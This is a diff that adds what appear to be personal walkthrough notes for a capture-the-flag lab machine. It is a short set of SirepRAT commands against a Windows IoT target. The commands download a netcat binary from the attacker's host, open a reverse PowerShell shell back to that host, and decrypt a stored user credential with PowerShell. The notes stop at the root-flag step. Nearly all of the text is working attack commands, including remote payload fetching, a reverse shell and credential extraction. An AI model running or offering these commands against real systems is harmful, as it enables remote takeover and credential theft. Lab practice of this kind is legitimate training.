@@ -1,0 +1,20 @@
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-WebRequest -OutFile C:\\Windows\\\System32\\spool\\drivers\\color\\nc64.exe --Uri http://10.10.14.28:8000/nc64.exe" --v
+
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.28 1234 -e powershell.exe" --v
+
+
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c dir C:\\Windows\\System32 -e powershell.exe" --v
+// workfor uploading payload
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-WebRequest -OutFile C:\\Windows\\System32\\nc64.exe -Uri http://10.10.14.28:8000/nc64.exe" --v
+
+
+// get the reverse shell by this 
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\nc64.exe 10.10.14.28 9090 -e powershell.exe" --v
+
+// after that find password of app user in C:\Program Files\WindowsPowerShell\Modules\PackageManagement cat r.bat file and after that access through webapp and their is way to execute command directly to the macine ,
+after that 
+$credential = Import-CliXml -Path U:\Users\app\user.txt
+$credential.GetNetworkCredential().Password
+
+to get the user flag 
+after that for root flag 
